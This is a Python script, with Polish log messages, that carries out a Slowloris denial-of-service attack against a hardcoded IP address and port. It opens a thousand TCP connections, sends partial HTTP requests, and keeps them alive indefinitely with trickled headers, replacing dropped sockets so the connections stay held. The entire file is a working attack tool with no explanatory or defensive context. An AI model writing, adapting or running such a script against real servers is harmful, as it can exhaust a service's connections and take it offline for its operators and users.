#!/usr/bin/env python3

import socket
import time
import logging
import random

HOST            = "212.182.24.27"
PORT            = 8080
SOCKET_COUNT    = 1000
SLEEP_INTERVAL  = 100
SOCKET_TIMEOUT  = 4

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s  %(message)s",
    datefmt="%H:%M:%S",
)


def create_socket() -> socket.socket | None:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(SOCKET_TIMEOUT)
        sock.connect((HOST, PORT))

        sock.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
        sock.send(f"Host: {HOST}:{PORT}\r\n".encode())
        sock.send(b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n")
        sock.send(b"Accept-language: en-US,en,q=0.5\r\n")
        return sock

    except socket.error as e:
        logging.debug("Błąd tworzenia gniazda: %s", e)
        return None


def send_keepalive_header(sock: socket.socket) -> bool:
    try:
        sock.send(b"X-a: b\r\n")
        return True
    except socket.error:
        return False


def slowloris_attack() -> None:
    logging.info("Cel: %s:%d", HOST, PORT)
    logging.info("Budowanie %d gniazd TCP...", SOCKET_COUNT)

    sockets: list[socket.socket] = []

    for _ in range(SOCKET_COUNT):
        sock = create_socket()
        if sock:
            sockets.append(sock)

    logging.info("Otwarto %d połączeń. Rozpoczynam atak...", len(sockets))

    while True:
        logging.info(
            "Aktywne połączenia: %d  |  Dosyłam nagłówek X-a: b do każdego...",
            len(sockets),
        )

        dead: list[socket.socket] = []
        for sock in sockets:
            if not send_keepalive_header(sock):
                dead.append(sock)

        # Usuń martwe gniazda
        for sock in dead:
            sockets.remove(sock)
            try:
                sock.close()
            except Exception:
                pass

        missing = SOCKET_COUNT - len(sockets)
        if missing > 0:
            logging.info("Dobudowuję %d gniazd...", missing)
            for _ in range(missing):
                sock = create_socket()
                if sock:
                    sockets.append(sock)

        logging.info("Czekam %d sekund przed następną porcją nagłówków...", SLEEP_INTERVAL)
        time.sleep(SLEEP_INTERVAL)


if __name__ == "__main__":
    try:
        slowloris_attack()
    except KeyboardInterrupt:
        logging.info("Atak przerwany przez użytkownika (Ctrl+C).")